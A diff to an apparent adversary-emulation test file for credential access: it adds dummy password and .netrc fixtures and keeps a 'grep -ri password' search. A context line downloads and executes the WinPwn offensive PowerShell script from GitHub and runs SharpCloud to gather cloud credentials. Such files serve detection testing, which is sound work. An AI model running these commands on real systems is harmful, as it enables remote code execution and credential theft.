@@ -23,7 +23,18 @@ atomic_tests:
     file_path:
       description: Path to search
       type: String
-      default: /
+      default: /tmp
+    file_name:
+      description: File path
+      type: String
+      default: /tmp/pass.txt    
+  dependencies:
+  - description: |
+      Test requrires a file to modify to be located at (#{file_name})
+    prereq_command: |
+      if [ -f #{file_name} ]; then exit 0; else exit 1; fi;
+    get_prereq_command: |
+      echo "password is Afirst" > #{file_name}
   executor:
     command: |
       grep -ri password #{file_path}
@@ -61,7 +72,18 @@ atomic_tests:
   supported_platforms:
     - macos
     - linux
-
+  input_arguments:
+    file_path:
+      description: file path
+      type: String
+      default: /tmp/.netrc
+  dependencies:
+  - description: |
+      Create a .netrc file
+    prereq_command: |
+      if [ -f #{file_path} ]; then exit 0; else exit 1; fi;
+    get_prereq_command: |
+      text="Machine github.com\nlogin Afirst\npassword test";echo -e $text > #{file_path}
   executor:
     name: bash
     elevation_required: false # Indicates whether command must be run with admin privileges. If the elevation_required attribute is not defined, the value is assumed to be false.
@@ -141,4 +163,3 @@ atomic_tests:
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       SharpCloud -consoleoutput -noninteractive  
     name: powershell   
-   
